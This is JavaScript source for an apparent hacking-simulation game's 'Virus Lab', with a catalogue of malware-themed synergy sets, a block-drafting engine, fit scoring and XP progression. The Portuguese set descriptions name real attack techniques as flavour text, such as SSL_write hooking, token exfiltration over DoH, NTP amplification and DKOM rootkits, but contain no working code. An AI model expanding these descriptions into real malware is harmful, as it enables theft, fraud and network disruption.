      { id: 'SET_03', num: 3,  family: 'vspam', minTier: 2, bonusMult: 1.14, name: 'Spooler STARTTLS Camaleão',    desc: 'Conexão cifrada 587 combinada com rotação dinâmica de cabeçalhos.' },
      { id: 'SET_04', num: 4,  family: 'vspam', minTier: 2, bonusMult: 1.16, name: 'Injetor Postfix Local',        desc: 'Sequestro direto do socket Unix do MTA sem passar pelo filtro externo.' },
      { id: 'SET_05', num: 5,  family: 'vspam', minTier: 3, bonusMult: 1.19, name: ' Hidra Polimórfica SPF',       desc: 'Mutação de Message-ID em cada lote impedindo assinatura de antispam.' },
      { id: 'SET_06', num: 6,  family: 'vspam', minTier: 3, bonusMult: 1.22, name: 'Turbina Epoll de Envelopes',   desc: 'Barramento de envelopes em memória alimentado por fila lock-free.' },
      { id: 'SET_07', num: 7,  family: 'vspam', minTier: 4, bonusMult: 1.25, name: 'Anel Mmap Zero-Alloc',         desc: 'Memória compartilhada disparando mensagens sem cópia para userspace.' },
      { id: 'SET_08', num: 8,  family: 'vspam', minTier: 4, bonusMult: 1.28, name: 'Tempestade Sendmmsg 128x',     desc: 'Rajada de pacotes SMTP fundidos direto na syscall sendmmsg.' },
      { id: 'SET_09', num: 9,  family: 'vspam', minTier: 5, bonusMult: 1.33, name: 'Espectro DKIM Zero-Day',       desc: 'Fusão completa de ring-buffer SMTP com apagamento forense de spool.' },
      { id: 'SET_10', num: 10, family: 'vspam', minTier: 5, bonusMult: 1.38, name: 'Oráculo Postal Ring-0',        desc: 'Daemon invisível no kernel disparando malotes SMTP em velocidade de linha.' },

      // 11..20: Família Warez (.vwarez)
      { id: 'SET_11', num: 11, family: 'vwarez', minTier: 1, bonusMult: 1.08, name: 'Semeador DHT Descentralizado', desc: 'Bootstrap UDP enxuto servindo blocos de 16 KB sem rastreador.' },
      { id: 'SET_12', num: 12, family: 'vwarez', minTier: 1, bonusMult: 1.11, name: 'Enxame Bitfield Mascarado',    desc: 'Ofuscação XOR de peças raras para manter upload constante.' },
      { id: 'SET_13', num: 13, family: 'vwarez', minTier: 2, bonusMult: 1.14, name: 'Ponte Sendfile Direta',        desc: 'Transferência disco-para-rede sem tocar buffers intermediários.' },
      { id: 'SET_14', num: 14, family: 'vwarez', minTier: 2, bonusMult: 1.16, name: 'Malha uTP LEDBAT Furtiva',     desc: 'Controle de congestionamento que usa 100% da banda ociosa do alvo.' },
      { id: 'SET_15', num: 15, family: 'vwarez', minTier: 3, bonusMult: 1.19, name: 'Fragmentador Reed-Solomon',    desc: 'Codificação de paridade distribuindo releases com zero perda.' },
      { id: 'SET_16', num: 16, family: 'vwarez', minTier: 3, bonusMult: 1.22, name: 'Túnel RC4 Anti-DPI',           desc: 'Criptografia de fluxo MSE camuflando o tráfego P2P do provedor.' },
      { id: 'SET_17', num: 17, family: 'vwarez', minTier: 4, bonusMult: 1.25, name: 'Pipe Splice de 1 Megabyte',    desc: 'Canalização contínua entre blocos ISO e sockets não-bloqueantes.' },
      { id: 'SET_18', num: 18, family: 'vwarez', minTier: 4, bonusMult: 1.28, name: 'Colmeia io_uring Zero-Copy',   desc: 'Submissão assíncrona no kernel saturando peers globais.' },
      { id: 'SET_19', num: 19, family: 'vwarez', minTier: 5, bonusMult: 1.33, name: 'Cofre Pirata Fileless (RAM)',  desc: 'Imagem inteira servida a partir de memfd_create sem tocar o HD.' },
      { id: 'SET_20', num: 20, family: 'vwarez', minTier: 5, bonusMult: 1.38, name: 'Leviatã P2P Kernel-Space',     desc: 'Semeador fantasma desvinculado da lista de processos com JIT nativo.' },

      // 21..30: Família Miner (.vminer)
      { id: 'SET_21', num: 21, family: 'vminer', minTier: 1, bonusMult: 1.08, name: 'Garimpeiro SHA-256d Básico',   desc: 'Afinidade de núcleo acoplada a moedor inteiro de nonces.' },
      { id: 'SET_22', num: 22, family: 'vminer', minTier: 1, bonusMult: 1.11, name: ' Operário Nice-19 Silencioso', desc: 'Minera em baixa prioridade recuando sempre que o usuário abre o top.' },
      { id: 'SET_23', num: 23, family: 'vminer', minTier: 2, bonusMult: 1.15, name: 'Pipeline YMM 256-bit',         desc: 'Registradores vetoriais alinhados enviando shares via Stratum.' },
      { id: 'SET_24', num: 24, family: 'vminer', minTier: 2, bonusMult: 1.17, name: 'Stratum Multiplexado Sem Trava', desc: 'Submissão assíncrona sem desperdiçar nenhum ciclo da ALU.' },
      { id: 'SET_25', num: 25, family: 'vminer', minTier: 3, bonusMult: 1.20, name: 'Forja HugePages 2MB',          desc: 'Scratchpad alocado em páginas gigantes eliminando TLB misses.' },
      { id: 'SET_26', num: 26, family: 'vminer', minTier: 3, bonusMult: 1.23, name: 'Dissipador Fantasma Térmico',  desc: 'Controle de timerslack e vzeroall mantendo temperatura invisível.' },
      { id: 'SET_27', num: 27, family: 'vminer', minTier: 4, bonusMult: 1.26, name: 'Motor RandomX AES-NI 4-Vias',  desc: 'Instruções de cifragem de hardware convertidas em hash-rate bruto.' },
      { id: 'SET_28', num: 28, family: 'vminer', minTier: 4, bonusMult: 1.29, name: 'Acelerador Lock-Free de DAG',  desc: 'Barramento L3 alimentando múltiplos núcleos sem contenção.' },
      { id: 'SET_29', num: 29, family: 'vminer', minTier: 5, bonusMult: 1.34, name: 'Reator AVX-512 SHA-NI 8-Vias', desc: 'Desdobramento quádruplo de midstate com instruções dedicadas SHA.' },
      { id: 'SET_30', num: 30, family: 'vminer', minTier: 5, bonusMult: 1.40, name: 'Singularidade Satoshi Ring-0', desc: 'Mineração em silício puro ocultando contadores PMC no kernel.' },

      // 31..40: Família BankTrojan (.vbank)
      { id: 'SET_31', num: 31, family: 'vbank', minTier: 1, bonusMult: 1.08, name: 'Gancho GOT libssl Clássico',   desc: 'Intercepta SSL_write antes da criptografia e restaura página RO.' },
      { id: 'SET_32', num: 32, family: 'vbank', minTier: 1, bonusMult: 1.12, name: 'Espelho Fetch de Sessão Web',  desc: 'Captura requisições JSON de home-banking direto na camada DOM.' },
      { id: 'SET_33', num: 33, family: 'vbank', minTier: 2, bonusMult: 1.15, name: 'Desviador SWIFT Fracionário',  desc: 'Reescreve o payload da remessa injetando taxa espelho silenciosa.' },
      { id: 'SET_34', num: 34, family: 'vbank', minTier: 2, bonusMult: 1.18, name: 'Coletor Assíncrono de IBAN',   desc: 'Varredura em memória combinada com fila não-bloqueante.' },
      { id: 'SET_35', num: 35, family: 'vbank', minTier: 3, bonusMult: 1.21, name: 'Extrator Bearer via DNS-HTTPS', desc: 'Clona tokens de autorização e exfiltra camuflado em tráfego DoH.' },
      { id: 'SET_36', num: 36, family: 'vbank', minTier: 3, bonusMult: 1.23, name: 'Sombra de Memória Ptrace',     desc: 'Leitura cruzada de heap do navegador sem injetar DLLs em disco.' },
      { id: 'SET_37', num: 37, family: 'vbank', minTier: 4, bonusMult: 1.27, name: 'Falsificador HMAC em Tempo Real', desc: 'Recalcula assinatura criptográfica do pacote bancário na própria RAM.' },
      { id: 'SET_38', num: 38, family: 'vbank', minTier: 4, bonusMult: 1.30, name: 'Trampolim JIT Financeiro',     desc: 'Código nativo gerado em memória alterando saldos em microssegundos.' },
      { id: 'SET_39', num: 39, family: 'vbank', minTier: 5, bonusMult: 1.35, name: 'Sonda Uprobe NSS Zero-Forense', desc: 'Captura chaves em trânsito via uprobe limpando qualquer rastro.' },
      { id: 'SET_40', num: 40, family: 'vbank', minTier: 5, bonusMult: 1.40, name: 'Fantasma Bancário Ring-0',     desc: 'Interceptação invisível de sessões TLS protegida por rootkit DKOM.' },

      // 41..50: Família DDoS (.vddos)
      { id: 'SET_41', num: 41, family: 'vddos', minTier: 1, bonusMult: 1.08, name: 'Canhão SYN Raw-Socket',        desc: 'Cabeçalho IP manual com portas efêmeras e TTL embaralhado.' },
      { id: 'SET_42', num: 42, family: 'vddos', minTier: 1, bonusMult: 1.12, name: 'Forja Checksum Rápida IPv4',   desc: 'Dobramento aritmético em 16 bits acelerando o disparo de pacotes.' },
      { id: 'SET_43', num: 43, family: 'vddos', minTier: 2, bonusMult: 1.15, name: 'Anel TPACKET_V3 de Placa',     desc: 'Fila de transmissão mapeada direto no buffer do driver de rede.' },
      { id: 'SET_44', num: 44, family: 'vddos', minTier: 2, bonusMult: 1.18, name: 'Multiplexador Epoll de Inundação', desc: ' Mantém milhares de descritores saturando o alvo sem travar.' },
      { id: 'SET_45', num: 45, family: 'vddos', minTier: 3, bonusMult: 1.21, name: 'Refletor NTP Monlist Oculto',  desc: 'Pulso de amplificação UDP escondido do netstat via marca BPF.' },
      { id: 'SET_46', num: 46, family: 'vddos', minTier: 3, bonusMult: 1.24, name: 'Turbina Lock-Free de Pacotes', desc: 'Geração paralela de frames alimentando a NIC sem locks.' },
      { id: 'SET_47', num: 47, family: 'vddos', minTier: 4, bonusMult: 1.27, name: 'Inundação AF_XDP Zero-Copy',   desc: 'Memória UMEM registrada pulando toda a pilha TCP/IP do sistema.' },
      { id: 'SET_48', num: 48, family: 'vddos', minTier: 4, bonusMult: 1.31, name: 'Rajada Vetorial YMM 64x',      desc: 'Grava 64 descritores de pacote por instrução AVX2.' },
      { id: 'SET_49', num: 49, family: 'vddos', minTier: 5, bonusMult: 1.36, name: 'Doorbell PCIe Line-Rate',      desc: 'Escrita MMIO direta no registrador da placa 10GbE com reset limpo.' },
      { id: 'SET_50', num: 50, family: 'vddos', minTier: 5, bonusMult: 1.42, name: 'Tsunami Orbital Ring-0',       desc: 'Enxame XDP nativo camuflado por desvinculação DKOM no kernel.' },

      // 51..54: 4 Conjuntos Híbridos / Mutações Cruzadas Lendárias
      { id: 'SET_51', num: 51, family: 'vminer', minTier: 2, bonusMult: 1.26, name: 'Quimera Bot-Miner Dual-Bus',   desc: 'Híbrido raro que combina barramento de rede com cálculo vetorial de hashes.', isHybrid: true },
      { id: 'SET_52', num: 52, family: 'vbank',  minTier: 2, bonusMult: 1.26, name: 'Spear-Banker SMTP-TLS',        desc: 'Mutação cruzada que une motor de e-mail com interceptador bancário TLS.', isHybrid: true },
      { id: 'SET_53', num: 53, family: 'vddos',  minTier: 3, bonusMult: 1.29, name: 'Tempestade Swarm P2P-Flood',   desc: 'Converte malha BitTorrent em canhão coordenado de inundação.', isHybrid: true },
      { id: 'SET_54', num: 54, family: 'vminer', minTier: 5, bonusMult: 1.45, name: 'Arquitetura Ômega Zero-Day',   desc: 'A junção suprema de Camada V + JIT + Rootkit Ring-0 em harmonia perfeita!', isHybrid: true }
    ];
    return sets;
  }

  const VIRUS_SYNERGY_SETS = build54SynergySets();
  const SET_BY_ID = new Map(VIRUS_SYNERGY_SETS.map((s) => [s.id, s]));

  function esc(str) {
    return String(str == null ? '' : str)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');
  }

  function shuffleCopy(arr) {
    const out = arr.slice();
    for (let i = out.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      const tmp = out[i];
      out[i] = out[j];
      out[j] = tmp;
    }
    return out;
  }

  const STRAIN_PREFIXES = ['Hydra', 'Spectre', 'Nyx', 'Kronos', 'Vortex', 'Obsidian', 'Kestrel', 'Cipher', 'Mantis', 'ZeroPulse'];
  const STRAIN_SUFFIXES = ['X1', 'Core', '99', 'Ghost', 'Prime', 'V2', 'Delta', 'Flux', 'Hex', 'Omega'];

  class VirusLabEngine {
    constructor() {
      this.userId = 'guest';
      this.activeTab = 'workbench'; // 'workbench' | 'creations' | 'codex'
      this.lastCompileReport = null;
      this.state = this.defaultState();
    }

    defaultState() {
      return {
        xp: 0,
        level: 1,
        totalCompiled: 0,
        discoveredSets: [], // IDs de VIRUS_SYNERGY_SETS descobertos
        creations: [],      // Histórico das cepas compiladas pelo jogador
        activeDraft: null   // { round: 1|2|3, optionsByRound: {1:[...],2:[...],3:[...]}, picks: { r1: null, r2: [], r3: null } }
      };
    }

    storageKey(uid) {
      return `HC_VIRUS_LAB_V1_${uid || 'guest'}`;
    }

    ensureLoaded() {
      if (this._loadingGuard) return;
      this._loadingGuard = true;
      try {
        const uid = (window.currentProfile && window.currentProfile.id) || 'guest';
        if (this.userId !== uid || !this.state) {
          this.userId = uid;
          try {
            const raw = localStorage.getItem(this.storageKey(uid));
            if (raw) {
              this.state = this.normalizeState(JSON.parse(raw));
            } else {
              this.state = this.defaultState();
            }
          } catch (e) {
            this.state = this.defaultState();
          }
        }
        if (!this.state.activeDraft && !this.lastCompileReport) {
          this.startNewDraft(true);
        }
      } finally {
        this._loadingGuard = false;
      }
    }

    normalizeState(raw) {
      const base = this.defaultState();
      if (!raw || typeof raw !== 'object') return base;
      const xp = Math.max(0, Math.round(Number(raw.xp) || 0));
      const lvlObj = this.computeLevelFromXp(xp, Number(raw.level) || 1);
      return {
        xp,
        level: lvlObj.level,
        totalCompiled: Math.max(0, Math.round(Number(raw.totalCompiled) || 0)),
        discoveredSets: Array.isArray(raw.discoveredSets)
          ? Array.from(new Set(raw.discoveredSets.filter((id) => SET_BY_ID.has(id))))
          : [],
        creations: Array.isArray(raw.creations) ? raw.creations.slice(0, 30) : [],
        activeDraft: raw.activeDraft && typeof raw.activeDraft === 'object' ? raw.activeDraft : null
      };
    }

    save() {
      try {
        localStorage.setItem(this.storageKey(this.userId), JSON.stringify(this.state));
      } catch (e) {}
    }

    computeLevelFromXp(xp, minFloorLevel = 1) {
      let current = LAB_LEVEL_TABLE[0];
      for (const row of LAB_LEVEL_TABLE) {
        if (xp >= row.xpReq) current = row;
      }
      if (minFloorLevel > current.level) {
        const forced = LAB_LEVEL_TABLE.find((r) => r.level === Math.min(MAX_LAB_LEVEL, minFloorLevel));
        if (forced) current = forced;
      }
      return current;
    }

    getLevelMeta() {
      this.ensureLoaded();
      const cur = LAB_LEVEL_TABLE.find((r) => r.level === this.state.level) || LAB_LEVEL_TABLE[0];
      const next = LAB_LEVEL_TABLE.find((r) => r.level === cur.level + 1) || null;
      let pct = 100;
      if (next) {
        const span = Math.max(1, next.xpReq - cur.xpReq);
        pct = Math.max(0, Math.min(100, Math.round(((this.state.xp - cur.xpReq) / span) * 100)));
      }
      return {
        ...cur,
        xp: this.state.xp,
        isMaxLevel: cur.level >= MAX_LAB_LEVEL,
        nextXpReq: next ? next.xpReq : cur.xpReq,
        nextUnlockNote: next ? next.unlockNote : 'Nível Máximo atingido — todos os 60 blocos e 54 conjuntos liberados!',
        progressPct: pct
      };
    }

    getCombinatoricsStats() {
      const r1 = ROUND_1_BLOCKS.length;
      const r2 = ROUND_2_BLOCKS.length;
      const r2Pairs = (r2 * (r2 - 1)) / 2;
      const r3 = ROUND_3_BLOCKS.length;
      return {
        r1Count: r1,
        r2Count: r2,
        r2Pairs,
        r3Count: r3,
        totalBlocks: r1 + r2 + r3,
        totalCombinations: r1 * r2Pairs * r3, // 20 * 276 * 16 = 88.320
        totalSynergySets: VIRUS_SYNERGY_SETS.length // 54 conjuntos
      };
    }

    getUnlockedPoolForRound(roundNum) {
      const meta = this.getLevelMeta();
      const source = roundNum === 1 ? ROUND_1_BLOCKS : (roundNum === 2 ? ROUND_2_BLOCKS : ROUND_3_BLOCKS);
      const unlocked = source.filter((b) => b.tier <= meta.maxTier);
      return unlocked.length >= 3 ? unlocked : source.slice(0, 3);
    }

    drawThreeRandomBlocks(roundNum) {
      const pool = this.getUnlockedPoolForRound(roundNum);
      return shuffleCopy(pool).slice(0, 3).map((b) => b.id);
    }

    // Inicia um novo ciclo de desenvolvimento de 3 rounds (3->1, 3->2, 3->1)
    startNewDraft(silent = false) {
      if (this.userId !== ((window.currentProfile && window.currentProfile.id) || 'guest')) {
        const uid = (window.currentProfile && window.currentProfile.id) || 'guest';
        this.userId = uid;
      }
      this.lastCompileReport = null;
      this.activeTab = 'workbench';
      this.state.activeDraft = {
        startedAt: Date.now(),
        round: 1,
        optionsByRound: {
          1: this.drawThreeRandomBlocks(1),
          2: [],
          3: []
        },
        picks: {
          r1: null,
          r2: [],
          r3: null
        },
        customName: `${STRAIN_PREFIXES[Math.floor(Math.random() * STRAIN_PREFIXES.length)]}-${STRAIN_SUFFIXES[Math.floor(Math.random() * STRAIN_SUFFIXES.length)]}`
      };
      this.save();
      if (!silent) this.renderUI();
      return this.state.activeDraft;
    }

    // Seleciona / alterna um bloco no round atual respeitando a regra estrita:
    // Round 1 -> escolhe apenas 1 | Round 2 -> escolhe exatamente 2 | Round 3 -> escolhe apenas 1
    toggleSelectBlock(blockId) {
      this.ensureLoaded();
      const draft = this.state.activeDraft;
      if (!draft) return { success: false };
      const r = draft.round;
      const allowed = draft.optionsByRound[r] || [];
      if (!allowed.includes(blockId)) {
        return { success: false, message: 'Este bloco não pertence às 3 opções sorteadas neste round.' };
      }

      if (r === 1) {
        draft.picks.r1 = draft.picks.r1 === blockId ? null : blockId;
      } else if (r === 2) {
        const cur = Array.isArray(draft.picks.r2) ? draft.picks.r2.slice() : [];
        const idx = cur.indexOf(blockId);
        if (idx >= 0) {
          cur.splice(idx, 1);
        } else {
          if (cur.length >= 2) {
            // Substitui o mais antigo para permitir trocar rápido entre as 3 opções mantendo máx 2!
            cur.shift();
          }
          cur.push(blockId);
        }
        draft.picks.r2 = cur;
      } else if (r === 3) {
        draft.picks.r3 = draft.picks.r3 === blockId ? null : blockId;
      }

      this.save();
      this.renderUI();
      return { success: true, round: r, picks: draft.picks };
    }

    advanceRound() {
      this.ensureLoaded();
      const draft = this.state.activeDraft;
      if (!draft) return { success: false };

      if (draft.round === 1) {
        if (!draft.picks.r1) {
          if (typeof window.showToast === 'function') window.showToast('Escolha 1 bloco de código para avançar ao Round 2!');
          return { success: false, message: 'Escolha 1 bloco no Round 1.' };
        }
        draft.round = 2;
        if (!Array.isArray(draft.optionsByRound[2]) || draft.optionsByRound[2].length !== 3) {
          draft.optionsByRound[2] = this.drawThreeRandomBlocks(2);
        }
        this.save();
        this.renderUI();
        return { success: true, round: 2 };
      }

      if (draft.round === 2) {
        if (!Array.isArray(draft.picks.r2) || draft.picks.r2.length !== 2) {
          if (typeof window.showToast === 'function') window.showToast('No Round 2 você precisa escolher exatamente 2 blocos de código!');
          return { success: false, message: 'Escolha exatamente 2 blocos no Round 2.' };
        }
        draft.round = 3;
        if (!Array.isArray(draft.optionsByRound[3]) || draft.optionsByRound[3].length !== 3) {
          draft.optionsByRound[3] = this.drawThreeRandomBlocks(3);
        }
        this.save();
        this.renderUI();
        return { success: true, round: 3 };
      }

      return { success: false };
    }

    // =========================================================================
    // MOTOR DE AVALIAÇÃO DE ENCAIXE (SINERGIA ESTRUTURAL + 54 CONJUNTOS)
    // =========================================================================
    evaluateAssembly(b1Id, b2Ids, b3Id) {
      const b1 = BLOCK_BY_ID.get(b1Id);
      const b2a = BLOCK_BY_ID.get(b2Ids && b2Ids[0]);
      const b2b = BLOCK_BY_ID.get(b2Ids && b2Ids[1]);
      const b3 = BLOCK_BY_ID.get(b3Id);
      if (!b1 || !b2a || !b2b || !b3 || b2a.id === b2b.id) {
        return null;
      }

      const diagnostics = [];
      let fitScore = 28; // Base estrutural mínima de compilação

      // 1) Acoplamento Round 1 (Entrada) -> Round 2 (Par de Núcleos)
      const match2a = b2a.channel === b1.channel || b2a.channel === 'universal_boost';
      const match2b = b2b.channel === b1.channel || b2b.channel === 'universal_boost';
      const hasStallTrap = b2a.channel === 'sync_stall' || b2b.channel === 'sync_stall';

      if (match2a && match2b) {
        fitScore += 32;
        diagnostics.push({
          kind: 'good',
          text: `Encaixe limpo de barramento: ${b1.fn.split('(')[0]} alimenta diretamente os dois núcleos do Round 2 sem conversão forçada.`
        });
      } else if (match2a || match2b) {
        fitScore += 14;
        diagnostics.push({
          kind: 'warn',
          text: `Acoplamento parcial no Round 2: apenas um dos blocos compartilha o descritor nativo (${b1.channel}); o outro exigiu ponte improvisada.`
        });
      } else {
        fitScore -= 10;
        diagnostics.push({
          kind: 'bad',
          text: `Atrito de ABI na Entrada: descritor ${b1.channel} foi ligado a rotinas de outro subsistema (${b2a.channel} / ${b2b.channel}), perdendo ciclos.`
        });
      }

      // 2) Harmonia interna entre os 2 blocos do Round 2
      if (hasStallTrap) {
        fitScore -= 18;
        diagnostics.push({
          kind: 'bad',
          text: `Gargalo severo detectado: serialized_debug_barrier() introduziu mutex bloqueante + sleep(2) no meio do payload!`
        });
      } else if (b2a.channel === b2b.channel && b2a.subRole !== b2b.subRole) {
        fitScore += 18;
        diagnostics.push({
          kind: 'good',
          text: `Dupla complementar no Round 2 (${b2a.subRole} + ${b2b.subRole}): pipeline paralelo sem disputa de memória.`
        });
      } else if (b2a.channel === 'universal_boost' || b2b.channel === 'universal_boost') {
        fitScore += 16;
        diagnostics.push({
          kind: 'good',
          text: `Acelerador assíncrono/lock-free acoplado ao núcleo principal, elevando a vazão de instruções.`
        });
      } else if (b2a.channel === b2b.channel) {
        fitScore += 10;
        diagnostics.push({
          kind: 'good',
          text: `Dois módulos da mesma arquitetura (${b2a.channel}) operando em série.`
        });
      } else {
        fitScore -= 4;
        diagnostics.push({
          kind: 'warn',
          text: `Núcleos híbridos heterogêneos (${b2a.channel} + ${b2b.channel}) dividindo registradores.`
        });
      }

      // 3) Fechamento & Furtividade no Round 3
      const r3MatchesR1 = b3.channel === b1.channel || b3.channel === 'universal_cloak';
      const r3MatchesAnyR2 = b3.channel === b2a.channel || b3.channel === b2b.channel;
      if (r3MatchesR1 && (match2a || match2b)) {
        fitScore += 22;
        diagnostics.push({
          kind: 'good',
          text: `Fechamento hermético no Round 3: ${b3.fn.split('(')[0]} selou o canal e ocultou os rastros de execução.`
        });
      } else if (r3MatchesR1 || r3MatchesAnyR2) {
        fitScore += 10;
        diagnostics.push({
          kind: 'warn',
          text: `Fechamento funcional parcial: descritor secundário encerrado com vazamento leve de handle.`
        });
      } else {
        fitScore -= 8;
        diagnostics.push({
          kind: 'bad',
          text: `Desfecho incompatível no Round 3: rotina ${b3.channel} não limpa corretamente os recursos abertos por ${b1.channel}.`
        });
      }

      // Coerência de Camadas (Tiers próximos evitam gargalo entre código legado e Zero-Day)
      const tiers = [b1.tier, b2a.tier, b2b.tier, b3.tier];
      const avgTier = tiers.reduce((a, b) => a + b, 0) / 4;
      const tierSpread = Math.max(...tiers) - Math.min(...tiers);
      if (tierSpread <= 1) {
        fitScore += 4;
      }

      fitScore = Math.max(12, Math.min(100, Math.round(fitScore)));

      // Determina a Família dominante do vírus resultante (vspam, vwarez, vminer, vbank, vddos)
      const famScores = { vspam: 0, vwarez: 0, vminer: 0, vbank: 0, vddos: 0 };
      if (famScores[b1.family] != null) famScores[b1.family] += 3.0;
      if (famScores[b2a.family] != null) famScores[b2a.family] += 2.6;
      if (famScores[b2b.family] != null) famScores[b2b.family] += 2.6;
      if (famScores[b3.family] != null) famScores[b3.family] += 2.2;

      let dominantFamily = b1.family in famScores ? b1.family : 'vspam';
      let bestFamWeight = -1;
      for (const [fk, fw] of Object.entries(famScores)) {
        if (fw > bestFamWeight) {
          bestFamWeight = fw;
          dominantFamily = fk;
        }
      }

      // Resolução de Conjunto Descoberto (dentre os 54 Conjuntos do Catálogo!)
      let matchedSet = null;
      if (fitScore >= 62 && !hasStallTrap) {
        matchedSet = this.resolveSynergySet(b1, b2a, b2b, b3, dominantFamily, avgTier, fitScore);
      }

      // Nota de Encaixe (F -> S+)
      let fitGrade = 'F';
      if (fitScore >= 94) fitGrade = 'S+';
      else if (fitScore >= 85) fitGrade = 'S';
      else if (fitScore >= 74) fitGrade = 'A';
      else if (fitScore >= 62) fitGrade = 'B';
      else if (fitScore >= 46) fitGrade = 'C';
      else if (fitScore >= 30) fitGrade = 'D';

      // Cálculo da Potência / Versão do Vírus Compilado:
      // Depende TANTO do Nível do Laboratório (teto maxVerInt) QUANTO do quão bem encaixada foi a escolha!
      const lvlMeta = this.getLevelMeta();
      const fitRatio = fitScore / 100;
      const tierFactor = 0.55 + (avgTier / 5) * 0.45; // 0.64 .. 1.00
      const setMult = matchedSet ? matchedSet.bonusMult : 0.86;

      let rawVerInt;
      if (fitScore < 42) {
        // Escolha mal encaixada -> vírus vem fraco/instável mesmo em laboratório avançado!
        rawVerInt = Math.round(6 + (lvlMeta.maxVerInt * 0.28 * fitRatio));
      } else {
        rawVerInt = Math.round(lvlMeta.maxVerInt * Math.pow(fitRatio, 1.18) * tierFactor * (setMult / 1.15));
      }
      const versionInt = Math.max(6, Math.min(lvlMeta.maxVerInt, rawVerInt));

      // Código-fonte fundido dos 4 blocos escolhidos
      const fusedCode = [
        `/* === [ROUND 1 · VETOR] ${b1.fn} (${b1.lang}) === */`,
        b1.code,
        '',
        `/* === [ROUND 2A · NÚCLEO] ${b2a.fn} (${b2a.lang}) === */`,
        b2a.code,
        '',
        `/* === [ROUND 2B · NÚCLEO] ${b2b.fn} (${b2b.lang}) === */`,
        b2b.code,
        '',
        `/* === [ROUND 3 · FECHAMENTO] ${b3.fn} (${b3.lang}) === */`,
        b3.code
      ].join('\n');

      return {
        blocks: [b1, b2a, b2b, b3],
        dominantFamily,
        familyMeta: VIRUS_FAMILY_META[dominantFamily],
        fitScore,
        fitGrade,
        avgTier: +avgTier.toFixed(2),
        matchedSet,
        versionInt,
        versionLabel: 'v' + (versionInt / 10).toFixed(1),
        diagnostics,
        fusedCode
      };
    }

    resolveSynergySet(b1, b2a, b2b, b3, dominantFamily, avgTier, fitScore) {
      const lvlMeta = this.getLevelMeta();
      // 1) Checar mutações híbridas lendárias (#51..#54)
      if (b1.tier === 5 && (b2a.id === 'R2_24' || b2b.id === 'R2_24') && b3.id === 'R3_16' && lvlMeta.maxTier >= 5) {
        return SET_BY_ID.get('SET_54');
      }
      const channels = new Set([b1.channel, b2a.channel, b2b.channel, b3.channel]);
      if (channels.has('simd_alu') && (channels.has('raw_pkt') || channels.has('p2p_chunk')) && fitScore >= 65) {
        return SET_BY_ID.get('SET_51');
      }
      if (channels.has('mail_pipe') && channels.has('tls_mem') && fitScore >= 65) {
        return SET_BY_ID.get('SET_52');
      }
      if (channels.has('p2p_chunk') && channels.has('raw_pkt') && fitScore >= 65) {
        return SET_BY_ID.get('SET_53');
      }

      // 2) Selecionar dentre os 10 conjuntos dedicados da família dominante (#01..#50)
      const famSets = VIRUS_SYNERGY_SETS.filter(
        (s) => !s.isHybrid && s.family === dominantFamily && s.minTier <= lvlMeta.maxTier
      );
      if (famSets.length === 0) return VIRUS_SYNERGY_SETS[0];

      // Mapeia deterministicamente a assinatura dos 4 blocos + camada média para um conjunto elegível da família!
      const hashNums = [b1.id, b2a.id, b2b.id, b3.id]
        .join('|')
        .split('')
        .reduce((acc, ch) => ((acc * 33) + ch.charCodeAt(0)) >>> 0, 5381);

      // Prioriza conjuntos do tier próximo ao avgTier dos blocos escolhidos
      const targetTier = Math.max(1, Math.min(lvlMeta.maxTier, Math.round(avgTier)));
      const nearTierSets = famSets.filter((s) => Math.abs(s.minTier - targetTier) <= 1);
      const candidateList = nearTierSets.length > 0 ? nearTierSets : famSets;
      return candidateList[hashNums % candidateList.length];
    }

    // Compila os 4 blocos escolhidos (1 + 2 + 1), calcula o encaixe, dá XP de Laboratório e entrega o vírus no PC!
    compileCurrentDraft(customNameInput) {
      this.ensureLoaded();
      const draft = this.state.activeDraft;
      if (!draft) return { success: false, message: 'Nenhum rascunho ativo na bancada.' };
      if (!draft.picks.r1 || !Array.isArray(draft.picks.r2) || draft.picks.r2.length !== 2 || !draft.picks.r3) {
        return { success: false, message: 'Complete os 3 rounds (1 + 2 + 1 blocos) antes de compilar!' };
      }

      const domNameEl = typeof document !== 'undefined' ? document.getElementById('vlabStrainNameInput') : null;
      const rawStrainName = String(customNameInput || (domNameEl && domNameEl.value) || draft.customName || 'Cepa-Zero').trim();
      const strainName = rawStrainName.slice(0, 26) || 'Cepa-Zero';

      const evalRes = this.evaluateAssembly(draft.picks.r1, draft.picks.r2, draft.picks.r3);
      if (!evalRes) {
        return { success: false, message: 'Falha ao validar os blocos selecionados.' };
      }

      // Verifica se descobriu um Conjunto inédito no Códice (X / 54)
      let isNewSetDiscovery = false;
      if (evalRes.matchedSet && !this.state.discoveredSets.includes(evalRes.matchedSet.id)) {
        this.state.discoveredSets.push(evalRes.matchedSet.id);
        isNewSetDiscovery = true;
      }

      // Concede XP de Laboratório (mesmo vírus fracos ensinam e dão XP base; encaixes fortes e novos conjuntos dão bônus!)
      const prevLevel = this.state.level;
      const baseXp = 35 + Math.round(evalRes.fitScore * 0.65);
      const discoveryBonusXp = isNewSetDiscovery ? 45 : 0;
      const gainedXp = baseXp + discoveryBonusXp;

      this.state.xp += gainedXp;
      const updatedLvl = this.computeLevelFromXp(this.state.xp, prevLevel);
      this.state.level = updatedLvl.level;
      const leveledUp = this.state.level > prevLevel;
      this.state.totalCompiled = (this.state.totalCompiled || 0) + 1;

      // Registra o vírus compilado no SoftwareEngine do jogador (Programas & Proteção)!
      let diskDelivery = null;
      if (window.softwareEngine && typeof window.softwareEngine.registerLabCompiledVirus === 'function') {
        diskDelivery = window.softwareEngine.registerLabCompiledVirus({
          virusKey: evalRes.dominantFamily,
          versionInt: evalRes.versionInt,
          strainName,
          setId: evalRes.matchedSet ? evalRes.matchedSet.id : null,
          setTitle: evalRes.matchedSet ? evalRes.matchedSet.name : null,
          fitGrade: evalRes.fitGrade,
          fitScore: evalRes.fitScore
        });
      }

      // Concede pequena reputação hacker autorizada pelo anti-cheat
      const repGain = Math.max(8, Math.round(evalRes.fitScore * 0.3));
      if (window.currentProfile) {
        const grantRep = () => {
          window.currentProfile.reputation = (Number(window.currentProfile.reputation) || 0) + repGain;
        };
        if (window.integrityGuard && typeof window.integrityGuard.runAuthorized === 'function') {
          window.integrityGuard.runAuthorized(grantRep);
        } else {
          grantRep();
        }
      }

      const creationRecord = {
